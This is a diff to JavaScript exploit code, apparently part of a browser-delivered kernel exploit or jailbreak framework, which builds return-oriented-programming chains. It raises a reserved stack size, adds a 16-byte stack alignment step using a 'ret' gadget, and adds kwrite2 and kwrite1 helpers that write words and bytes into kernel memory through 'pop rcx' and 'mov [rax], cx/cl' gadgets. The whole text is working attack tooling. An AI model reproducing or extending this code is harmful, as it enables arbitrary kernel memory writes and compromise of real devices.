@@ -1,5 +1,5 @@
 const stack_sz = 0x40000;
-const reserve_upper_stack = 0x8000;
+const reserve_upper_stack = 0x10000;
 const stack_reserved_idx = reserve_upper_stack / 4;
 
 
@@ -80,6 +80,10 @@ window.rop = function () {
             this.push(r9);
         }
 
+        if (this.stack.add32(this.count * 0x8).low & 0x8) {
+            this.push(gadgets["ret"]);
+        }
+
         this.push(rip);
         return this;
     }
@@ -148,11 +152,26 @@ window.rop = function () {
         this.push(qword);
         this.push(gadgets["mov [rax], rsi"]);
     }
+
     this.kwrite4 = function (offset, dword) {
         this.rax_kernel(offset);
         this.push(gadgets["pop rdx"]);
         this.push(dword);
         this.push(gadgets["mov [rax], edx"]);
+    }
+
+    this.kwrite2 = function (offset, word) {
+        this.rax_kernel(offset);
+        this.push(gadgets["pop rcx"]);
+        this.push(word);
+        this.push(gadgets["mov [rax], cx"]);
+    }
+
+    this.kwrite1 = function (offset, byte) {
+        this.rax_kernel(offset);
+        this.push(gadgets["pop rcx"]);
+        this.push(byte);
+        this.push(gadgets["mov [rax], cl"]);
     }
 
     this.kwrite8_kaddr = function (offset1, offset2) {
